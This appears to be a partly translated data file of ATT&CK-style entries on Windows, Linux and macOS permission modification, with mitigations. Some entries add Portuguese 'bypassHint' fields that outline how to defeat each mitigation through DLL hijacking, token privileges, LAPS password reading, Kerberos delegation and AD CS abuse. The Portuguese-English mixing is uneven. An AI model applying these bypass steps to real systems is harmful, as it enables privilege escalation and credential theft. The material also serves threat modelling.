Os adversários podem também change permissions of symbolic links. Por exemplo, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. `[Ref: new_rust_based_ransomware]` `[Ref: bad_luck_blackcat]` `[Ref: falconoverwatch_blackcat_attack]` `[Ref: blackmatter_blackcat]` `[Ref: fsutil_behavior]`

mitigations.name: Restrict File and Directory Permissions
mitigations.descriptionPt: Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded. `[Ref: create_sym_links]`
mitigations.bypassHint: Auditar permissões efetivas com `AccessChk` / `PowerUp` procurando Unquoted Service Paths (`T1574.009`), Ghost DLL Hijacking (DLLs inexistentes que um serviço `SYSTEM` tenta carregar a partir de pastas no `PATH` onde o utilizador tem escrita - `T1574.001`) ou explorar privilégios de token como `SeBackupPrivilege` / `SeRestorePrivilege` para ignorar ACLs NTFS (`FILE_FLAG_BACKUP_SEMANTICS`).

mitigations.name: Privileged Account Management
mitigations.descriptionPt: Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality.
mitigations.bypassHint: Abandonar a tentativa de reutilização horizontal de credenciais locais. Em vez disso: (1) Enumerar quem tem permissão de leitura do atributo `ms-Mcs-AdmPwd` (LAPS v1) ou `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS) no Active Directory via LDAP (`T1087.002`); (2) Extrair Tokens ou Tickets Kerberos de utilizadores de domínio com sessão ativa na máquina comprometida (`T1134.001` / `T1550.003`); (3) Explorar delegações Kerberos (Unconstrained / Constrained / RBCD - `T1558`) ou certificados AD CS vulneráveis (ESC1-ESC8 - `T1649`).

techniques.fullNameEn: File and Directory Permissions Modification: Windows Permissions
techniques.fullNamePt: Modificação de Permissões de Ficheiros e Diretórios: Windows Permissions
techniques.descriptionPt:
Os adversários podem modificar file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. `[Ref: Hybrid Analysis Icacls1 June 2018]` `[Ref: Hybrid Analysis Icacls2 May 2018]` File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). `[Ref: Microsoft DACL May 2018]` De forma semelhante a a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied. `[Ref: Microsoft Access Control Lists May 2018]`

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, **PowerShell** (`T1059.001`) provides cmdlets that pode ser utilizado para retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via **Accessibility Features** (`T1546.008`), **Boot or Logon Initialization Scripts** (`T1037`), or tainting/hijacking other instrumental binary/configuration files via **Hijack Execution Flow** (`T1574`).

techniques.fullNameEn: File and Directory Permissions Modification: Linux and Mac Permissions
techniques.fullNamePt: Modificação de Permissões de Ficheiros e Diretórios: Linux and Mac Permissions
techniques.descriptionPt:
Os adversários podem modificar file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. `[Ref: Hybrid Analysis Icacls1 June 2018]` `[Ref: Hybrid Analysis Icacls2 May 2018]` File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: `chown` (short for change owner), and `chmod` (short for change mode).

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via **Unix Shell Configuration Modification** (`T1546.004`) or tainting/hijacking other instrumental binary/configuration files via **Hijack Execution Flow** (`T1574`). `[Ref: 20 macOS Common Tools and Techniques]`
